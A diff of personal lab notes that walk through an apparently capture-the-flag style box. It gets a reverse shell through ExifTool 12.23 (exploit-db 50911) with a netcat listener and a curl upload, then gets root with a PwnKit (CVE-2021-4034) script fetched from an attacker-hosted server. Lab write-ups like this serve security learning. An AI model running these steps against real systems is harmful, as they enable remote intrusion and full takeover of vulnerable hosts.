@@ -80,7 +80,7 @@ next up is...well, we can just use `ftp` normally.
 okay. don't use filezilla. just use normal `ftp` client.
 
 
-ftp ftp://user:system@192.168.60.183
+ftp ftp://user:system@192.168.55.183
 
 `ls` seems to fail.... or hang?
 
@@ -89,7 +89,7 @@ needed to turn off passive mode.
 	passive
 
 packet # 891 is what we want.
-
+<!--
 0000   50 4f 53 54 20 2f 65 78 69 66 74 65 73 74 2e 70   POST /exiftest.p
 0010   68 70 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73   hp HTTP/1.1..Hos
 0020   74 3a 20 31 32 37 2e 30 2e 30 2e 31 0d 0a 55 73   t: 127.0.0.1..Us
@@ -151,7 +151,7 @@ curl -X POST http://192.168.60.183:80/exiftest.php \
 ```
 There is no file to upload.                                                                                                          
 
-dang it.
+dang it.-->
 
 okay, so, this was a rabbit hole.
 
@@ -161,3 +161,87 @@ god it's so annoying using a small screen with this. I can't wait for my new lap
 https://sec-fortress.github.io/posts/pg/posts/exghost.html
 
 it's so finicky. I'm just going to wait for my new laptop to resume doing these labs...
+
+new laptop, time to resume.
+
+so, apparently `/exiftest.php` is running...well, I can't seem to find it from the wireshark trace, but
+`12.23` is the version of `ExifTool` that the victim is running. let's search exploit-db
+
+https://www.exploit-db.com/exploits/50911
+
+
+sudo apt install -y djvulibre-bin
+
+## (generate the payload that triggers reverse shell)
+
+```
+export ATTACKER_IP=192.168.49.55
+python 50911.py -s $ATTACKER_IP 4444
+```
+
+## start rev shell listener (wait for connection)
+
+```
+nc -nvlp 4444
+```
+## upload payload (trigger connection)
+
+```
+export VICTIM_IP=192.168.55.183
+curl -F myFile=@image.jpg http://$VICTIM_IP:80/exiftest.php
+```
+
+## stabilize shell
+
+```
+which python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## user flag
+
+```
+cat /home/hassan/local.txt
+```
+
+
+## pivoting to root
+
+okay, so let's look at `/usr/lib/policykit-1/`.
+
+```
+
+ls /usr/lib/policykit-1/
+
+polkit-agent-helper-1  polkitd
+
+
+ls -lash /usr/lib/policykit-1/polkit-agent-helper-1
+# 24K -rwsr-xr-x 1 root root 23K May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
+
+```
+
+claude sez...
+
+
+- /usr/lib/policykit-1/polkit-agent-helper-1 is SUID root (-rwsr-xr-x)
+- Compiled May 26 2021 — vulnerable version
+
+The exploit is CVE-2021-4034 (PwnKit) — a local privesc in pkexec (part of policykit-1). It affects all versions
+before 0.105-26.
+
+okay! let's do it.
+    
+### transferring to victim
+
+    # on attacker
+    wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py
+    python3 -m http.server 8888
+    
+    # on victim
+    cd /dev/shm/
+    export ATTACKER_IP=192.168.49.55
+    wget $ATTACKER_IP:8888/CVE-2021-4034.py
+    python3 CVE-2021-4034.py
+
+we have root.
